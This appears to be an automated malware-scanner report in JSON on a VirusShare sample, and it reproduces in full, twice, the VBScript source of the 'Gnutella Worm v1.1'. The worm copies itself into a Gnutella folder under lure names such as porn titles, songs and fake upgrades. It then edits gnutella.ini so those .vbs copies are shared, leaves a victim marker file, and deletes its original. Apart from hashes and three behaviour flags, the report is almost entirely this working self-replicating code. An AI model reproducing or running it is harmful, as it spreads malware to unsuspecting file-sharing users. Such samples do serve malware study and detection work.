{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file"
        },
        "macro": "Option Explicit\nDim CurrentFilename, CurrentGeneration, InfectionDate\nCurrentFilename = \"Battlefield Earth.vbs\"\nCurrentGeneration = 17\nInfectionDate = \"7/23/00, 10:45:59 PM\"\n\n\n'\nconst ProgramName = \"Gnutella Worm v1.1\"\nconst ProgramDate = \"2000 May 21. I think that's the first Gnutella Worm.\"\n'\n'\n' Watching CurrentGeneration will be quite interesting. I wonder if\n' anyone ever studied this compared with real viral spreading.\n'\n' 42\n'\n' History\n'\n'  1.1  o Now copies itself to a list of target keyword instead of just current filename\n'       o Fixed a but with Ini path... (1.0 didn't work at all. he he.)\n'\n'  1.0  o Initial Release\n'\n\n' Behavior Control Parameters\nDim NewFilenames, GnutellaPath, GnutellaIni, VictimFilename\nNewFilenames    = Array(ProgramName & \".vbs\", \"Jenna Jameson movie listing.vbs\", \"Pamela Anderson movie listing.vbs\", \"Asia Carerra movie listing.vbs\", \"xxx FTP movie listing.vbs\", \"ASF Compressor (No quality loss).vbs\", \"collegesex.vbs\", \"Gladiator.vbs\", \"Battlefield Earth.vbs\", \"Evangelion complete episodes scripts.vbs\", \"Scan Master checklist.vbs\", \"How to eat pussy.vbs\", \"Alicia Silverstone.vbs\", \"Pearl Jam.vbs\", \"Mp3 compressor (Half the size but same quality).vbs\", \"Napster Metallica Crack.vbs\", \"Santana.vbs\", \"NSync.vbs\", \"Nirvana.mp3.vbs\", \"Shania Twain.mp3.vbs\", \"Jesus loves you.vbs\", \"Gnutella upgrade.vbs\", \"OFFICIAL Gnutella Option Pack.vbs\")\nGnutellaPath    = \"C:\\Program Files\\gnutella\\\"\nGnutellaIni     = GnutellaPath + \"gnutella.ini\"\nVictimFilename  = \"Yet another GWV! \"                   ' (Gnutella Worm Victim :)\n\n\nConst ForReading = 1\nConst ForWriting = 2\n\n\nDim fso\nDim SourceFile, DestinationFile\nDim NewFilename\nDim VictimName\n\nFunction ModifyAndCopy\n  ' Change Header data (New name, Generation number, any info passed down to the next Generation)\n\n  DestinationFile.WriteLine(SourceFile.ReadLine)\n  DestinationFile.WriteLine(SourceFile.ReadLine)\n\n  DestinationFile.WriteLine(\"CurrentFilename = \"\"\" & NewFilename & \"\"\"\")\n\n  DestinationFile.WriteLine(\"CurrentGeneration = \" & (CurrentGeneration + 1))\n\n  DestinationFile.WriteLine(\"InfectionDate = \"\"\" & Date & \", \" & Time & \"\"\"\")\n\n  SourceFile.ReadLine ' Skip the ones we just wrote changed.\n  SourceFile.Readline\n  SourceFile.Readline\n\n\n  ' Copy the rest of the file as-is\n  Do While Not SourceFile.AtEndOfStream\n    DestinationFile.WriteLine(SourceFile.ReadLine)\n  Loop\nEnd Function\n\nFunction ProcessIni\n  Dim IniFile, IniFileDest\n  Dim Line\n\n  Set IniFile = fso.OpenTextFile(GnutellaIni, ForReading)\n  Set IniFileDest = fso.CreateTextFile(GnutellaIni + \"_\", ForWriting)\n\n  Do While Not IniFile.AtEndOfStream\n    Line = IniFile.ReadLine\n\n    if Left(Line, 8) = \"extlist=\" Then\n      IniFileDest.WriteLine(Line + \";vbs\")\n    ElseIf Left(Line, 13) = \"databasepath=\" Then\n      IniFileDest.WriteLine(Line + \";\" + GnutellaPath)\n    ElseIf Left(Line, 12) = \"clientid128=\" Then\n      VictimName = Mid(Line, 13)\n      IniFileDest.WriteLine(Line)\n    Else\n      IniFileDest.WriteLine(Line)\n    End If\n  Loop\n\n  IniFileDest.Close\n  IniFile.Close\n\n  fso.DeleteFile(GnutellaIni)\n  fso.MoveFile GnutellaIni + \"_\", GnutellaIni\n\nEnd Function\n\nFunction SignalVictim\n  Dim Victim\n  Dim Line\n  Dim SignatureFilename\n  \n  SignatureFilename = GnutellaPath & VictimFilename & VictimName & \".zip\"\n\n  Set Victim = fso.CreateTextFile(SignatureFilename, ForWriting)\n\n  Victim.WriteLine(\"Generation #: \" & CurrentGeneration)\n  Victim.WriteLine(\"Victim ID: \" & VictimName)\n  Victim.WriteLine(\"Infection date: \" & InfectionDate)\n  \n  Victim.WriteLine(\"If I was a naughty boy, I could use scripting to get name, email, whatever file I want.\")\n\n  Victim.Close\nEnd Function\n\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\n\nIf fso.FolderExists(GnutellaPath) Then\n  For Each NewFilename in NewFilenames\n\n    Set DestinationFile = fso.CreateTextFile(GnutellaPath + NewFilename, True)\n    Set SourceFile = fso.OpenTextFile(CurrentFilename, ForReading)\n\n    ModifyAndCopy\n    ProcessIni\n    SignalVictim\n\n    SourceFile.Close\n    DestinationFile.Close\n  Next\n\nEnd If\n\nfso.DeleteFile(CurrentFilename)\n"
    },
    "filename": "VirusShare_0c65715b23953caaa4b09193148fe979",
    "filesize": 4221,
    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "0c65715b23953caaa4b09193148fe979",
        "sha1": "1207635bb15e9a244d3fb97b7f7b8e4bf147f4cb",
        "sha256": "3cc283beadccc5b2cf70bb73367065b0251c7fd01cb253114a78cdd17d3d1f8e"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Option Explicit",
            "Dim CurrentFilename, CurrentGeneration, InfectionDate",
            "CurrentFilename = \"Battlefield Earth.vbs\"",
            "CurrentGeneration = 17",
            "InfectionDate = \"7/23/00, 10:45:59 PM\"",
            "const ProgramName = \"Gnutella Worm v1.1\"",
            "const ProgramDate = \"2000 May 21. I think that's the first Gnutella Worm.\"",
            "' Watching CurrentGeneration will be quite interesting. I wonder if",
            "' anyone ever studied this compared with real viral spreading.",
            "' 42",
            "' History",
            "'  1.1  o Now copies itself to a list of target keyword instead of just current filename",
            "'       o Fixed a but with Ini path... (1.0 didn't work at all. he he.)",
            "'  1.0  o Initial Release",
            "' Behavior Control Parameters",
            "Dim NewFilenames, GnutellaPath, GnutellaIni, VictimFilename",
            "NewFilenames    = Array(ProgramName & \".vbs\", \"Jenna Jameson movie listing.vbs\", \"Pamela Anderson movie listing.vbs\", \"Asia Carerra movie listing.vbs\", \"xxx FTP movie listing.vbs\", \"ASF Compressor (No quality loss).vbs\", \"collegesex.vbs\", \"Gladiator.vbs\", \"Battlefield Earth.vbs\", \"Evangelion complete episodes scripts.vbs\", \"Scan Master checklist.vbs\", \"How to eat pussy.vbs\", \"Alicia Silverstone.vbs\", \"Pearl Jam.vbs\", \"Mp3 compressor (Half the size but same quality).vbs\", \"Napster Metallica Crack.vbs\", \"Santana.vbs\", \"NSync.vbs\", \"Nirvana.mp3.vbs\", \"Shania Twain.mp3.vbs\", \"Jesus loves you.vbs\", \"Gnutella upgrade.vbs\", \"OFFICIAL Gnutella Option Pack.vbs\")",
            "GnutellaPath    = \"C:\\Program Files\\gnutella\\\"",
            "GnutellaIni     = GnutellaPath + \"gnutella.ini\"",
            "VictimFilename  = \"Yet another GWV! \"                   ' (Gnutella Worm Victim :)",
            "Const ForReading = 1",
            "Const ForWriting = 2",
            "Dim fso",
            "Dim SourceFile, DestinationFile",
            "Dim NewFilename",
            "Dim VictimName",
            "Function ModifyAndCopy",
            "  ' Change Header data (New name, Generation number, any info passed down to the next Generation)",
            "  DestinationFile.WriteLine(SourceFile.ReadLine)",
            "  DestinationFile.WriteLine(SourceFile.ReadLine)",
            "  DestinationFile.WriteLine(\"CurrentFilename = \"\"\" & NewFilename & \"\"\"\")",
            "  DestinationFile.WriteLine(\"CurrentGeneration = \" & (CurrentGeneration + 1))",
            "  DestinationFile.WriteLine(\"InfectionDate = \"\"\" & Date & \", \" & Time & \"\"\"\")",
            "  SourceFile.ReadLine ' Skip the ones we just wrote changed.",
            "  SourceFile.Readline",
            "  SourceFile.Readline",
            "  ' Copy the rest of the file as-is",
            "  Do While Not SourceFile.AtEndOfStream",
            "    DestinationFile.WriteLine(SourceFile.ReadLine)",
            "  Loop",
            "End Function",
            "Function ProcessIni",
            "  Dim IniFile, IniFileDest",
            "  Dim Line",
            "  Set IniFile = fso.OpenTextFile(GnutellaIni, ForReading)",
            "  Set IniFileDest = fso.CreateTextFile(GnutellaIni + \"_\", ForWriting)",
            "  Do While Not IniFile.AtEndOfStream",
            "    Line = IniFile.ReadLine",
            "    if Left(Line, 8) = \"extlist=\" Then",
            "      IniFileDest.WriteLine(Line + \";vbs\")",
            "    ElseIf Left(Line, 13) = \"databasepath=\" Then",
            "      IniFileDest.WriteLine(Line + \";\" + GnutellaPath)",
            "    ElseIf Left(Line, 12) = \"clientid128=\" Then",
            "      VictimName = Mid(Line, 13)",
            "      IniFileDest.WriteLine(Line)",
            "    Else",
            "      IniFileDest.WriteLine(Line)",
            "    End If",
            "  Loop",
            "  IniFileDest.Close",
            "  IniFile.Close",
            "  fso.DeleteFile(GnutellaIni)",
            "  fso.MoveFile GnutellaIni + \"_\", GnutellaIni",
            "End Function",
            "Function SignalVictim",
            "  Dim Victim",
            "  Dim Line",
            "  Dim SignatureFilename",
            "  SignatureFilename = GnutellaPath & VictimFilename & VictimName & \".zip\"",
            "  Set Victim = fso.CreateTextFile(SignatureFilename, ForWriting)",
            "  Victim.WriteLine(\"Generation #: \" & CurrentGeneration)",
            "  Victim.WriteLine(\"Victim ID: \" & VictimName)",
            "  Victim.WriteLine(\"Infection date: \" & InfectionDate)",
            "  Victim.WriteLine(\"If I was a naughty boy, I could use scripting to get name, email, whatever file I want.\")",
            "  Victim.Close",
            "End Function",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "If fso.FolderExists(GnutellaPath) Then",
            "  For Each NewFilename in NewFilenames",
            "    Set DestinationFile = fso.CreateTextFile(GnutellaPath + NewFilename, True)",
            "    Set SourceFile = fso.OpenTextFile(CurrentFilename, ForReading)",
            "    ModifyAndCopy",
            "    ProcessIni",
            "    SignalVictim",
            "    SourceFile.Close",
            "    DestinationFile.Close",
            "  Next",
            "End If",
            "fso.DeleteFile(CurrentFilename)"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.286012",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
